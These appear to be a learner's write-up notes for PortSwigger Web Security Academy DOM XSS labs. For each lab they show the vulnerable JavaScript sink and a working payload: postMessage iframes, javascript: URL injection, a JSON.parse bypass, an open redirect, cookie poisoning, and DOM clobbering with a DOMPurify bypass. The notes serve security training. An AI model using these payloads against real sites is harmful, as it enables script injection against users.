## DOM XSS using web messages
We see in the webpage javascript there is the following event listener:
```
<script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
</script>
```

Staging the payload in the exploit server. 
```
<iframe src="https://0ae4003904d6f1f482f4e23200d20060.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print() >', '*')" >
```

## DOM XSS using web messages and a javascript URL
The page contains a sink in the form of a message event listener:
```
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>              
```
Stage an exploit on a page that the user visits.
The iframe loads the target site and calls contextWindow.postMessage to trigger the event listener.
The message includes javascript for any (*) target origin
```
<iframe src="https://0a27003803718cf18050940e007f00d6.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

## DOM XSS using web messages and *JSON.parse*
Similar vulnerability except the sink now calls JSON.parse(e.data) and returns if the validation fails.
The exploit payload delivers a JSON object where the url calls malicious javascript. 
```
<iframe src=https://0a55002603bafe7d81a09d2000d50006.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({type:"load-channel",url:"javascript:print()"}),"*")'>
```

## DOM XSS using redirect url 
The blog post page contains a "Back to Blog" button which redirects to the homepage. 
The button includes an anchor which uses regex to get the url, allowing an attacker to insert an arbitrary url as the query parameter.

```
<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>
```

Exploit is to add the url query parameter to the URL to add it to the location object. 
The regex will process it as the redirect url.
```
https://0ac700710410da51818e07ba00f3006b.web-security-academy.net/post?postId=10&url=https://exploit-0ac30026047cda8a81bd061a014900b6.exploit-server.net/
```

Mitigation: use strict validation against a whitelist of URLs

## DOM XSS with cookie manipulation
The page uses a cookie called lastViewedProduct whose value is the last product url visited.
We can stage an exploit where we initially navigatre to a product page and append some malicious javascript to the url.
This URL is saved in the cookie. Then when we call the onload and are redirected to the home page, the cookie loads the javascript.

```
<iframe src="https://0a56007f0348ed7b801b8f5b004d002f.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a56007f0348ed7b801b8f5b004d002f.web-security-academy.net';window.x=1;">
```

## DOM clobbering to enable XSS (expert)
From [Portswigger DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering):
>The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form's actual submit() function.

The Blog page contains a javascript function displayComments which is vulnerable to DOM clobbering:
```
      let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
      let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
```
We can inject a DOM clobbering payload as the avatar when we upload a comment to override the globally-scoped window.defaultAvatar variable. In the anchor href we can inject the malicious javascript.
```
<a id=defaultAvatar> <a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
The cid: protocol is to bypass DOMPurify
